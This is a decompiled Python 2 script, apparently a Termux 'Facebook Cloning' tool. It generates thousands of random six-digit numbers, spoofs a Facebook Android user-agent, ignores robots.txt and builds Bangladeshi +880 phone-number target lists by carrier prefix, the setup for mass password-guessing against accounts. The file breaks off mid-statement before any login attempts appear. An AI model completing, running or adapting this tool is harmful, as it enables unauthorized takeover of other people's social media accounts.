# Decompile by FARHAN-MUH-TASIM:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-09-07 08:13:36.727454
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(7000):
    number = random.randint(111111, 999999)
    
    sys.stdout = open('.txt', 'a')
    print(number)
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 number.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def t():
    time.sleep(1)
def cb():
    os.system('clear')
B='\033[1;94m'
K='\033[1;90m'
M='\033[1;98m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
logo = """
███████╗██████╗░███╗░░██╗░░░░░░░██╗░░░░░░░██╗██╗███████╗██╗
██╔════╝██╔══██╗████╗░██║░░░░░░░██║░░██╗░░██║██║██╔════╝██║
█████╗░░██████╔╝██╔██╗██║█████╗░╚██╗████╗██╔╝██║█████╗░░██║
██╔══╝░░██╔══██╗██║╚████║╚════╝░░████╔═████║░██║██╔══╝░░██║
██║░░░░░██║░░██║██║░╚███║░░░░░░░░╚██╔╝░╚██╔╝░██║██║░░░░░██║
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝\033[1;36m2.O
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 \033[1;37mOwner   :            FARHAN MUH TASIM
 \033[1;37mFacebook:            FARHAN MUH TASIM
 \033[1;37mGithub  :            gtajisan X me
 \033[1;37mWhatsapp:            +880130505723*
 \033[1;31mTOOL INF: Facebook Cloning 

 \033[1;31mFor Help : FB-AND-TELEGRAM

 \033[1;31mNote    :       FB Cloning 
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;32m
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   MAFIA-KILLER-FAHAN☕
           💕💕         BE HAPPY 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕         
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 FARHAN MUH TASIM 💗
\x1b[1;91m➣ PGE NAME :  💣FARHAN-TECH####/##💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +880130505723* 👬
\x1b[1;95m➣ WARNING :  👉 DON,T CALL ME ONLY TEXT🔫
\x1b[1;96m➣ CLONING COUNTRY NAME :  BANGLADESH
\x1b[1;97m➣ NOTE :      💕USE 4GB YA 6GB RAM MOBILE💕
\x1b[1;92m➣ NOTE :      👏USE FAST 4G SIM NET👏
\x1b[1;91m➣ NOTE :      🌍 1ST CLEAR TERMUX MEMORY DATA🌍
\x1b[1;95m➣ NOTE :  🔎NO NEED VPN🔎 ( 🌷WITHOUT LOGIN🌷 )
\x1b[1;93m➣ DISCLAMIAR :  👊AWAY FROM ILLIGAL WAY👊
\x1b[1;93m
"""
back = 0
successful = []
checkpoint = []
successfull = []
id = []
os.system("clear")
print  """
      💙💙                    💙💙 
    💙🍁🍁💙   💙🍁🍁💙
  💙 🍁🍁🍁💙🍁🍁🍁 💙
   💙🍁🍁🍁🍁🍁🍁🍁💙
     💙🍁🍁🍁🍁🍁🍁💙
          💙🍁🍁🍁🍁💙
               💙🍁🍁💙          
        ❤❤  💙 💙 ❤❤
   ❤🍃🍃❤ 💙❤🍃🍃❤
  ❤ 🍃🍃🍃❤🍃🍃🍃 ❤
   ❤🍃🍃🍃🍃🍃🍃🍃❤
     ❤🍃🍃🍃🍃🍃🍃❤
          ❤🍃🍃🍃🍃❤
               ❤🍃🍃❤
                   ❤ ❤ 
                      ❤ 
 """
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-FARHAN)💘💘💘━━━━━━━━💖\n" 
	print '\033[1;97m[1]\033[1;92m GP'
	print '\033[1;97m[2]\033[1;92m Robi'
	print '\033[1;97m[3]\033[1;92m Airtel'
	print '\033[1;97m[4]\033[1;92m Banglalink'
	print '\033[1;97m[5]\033[1;92m Teletalk'
	print '\033[1;97m[6]\033[1;92m Youtube'
	print '\033[1;97m[0]\033[1;92m Exit            '
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-FARHAN)💘💘💘━━━━━━━━💖\n" 
	action()
	
def action():
	ahmad = raw_input('\n\033[1;91m>>>  ')
	if ahmad =='':
		print '[!] Fill in correctly'
		action()
	elif ahmad =="1":
		os.system("clear")
		print (logo2)
		print("\033[1;93m170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139")
		try:
			c = raw_input("\033[1;96m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("
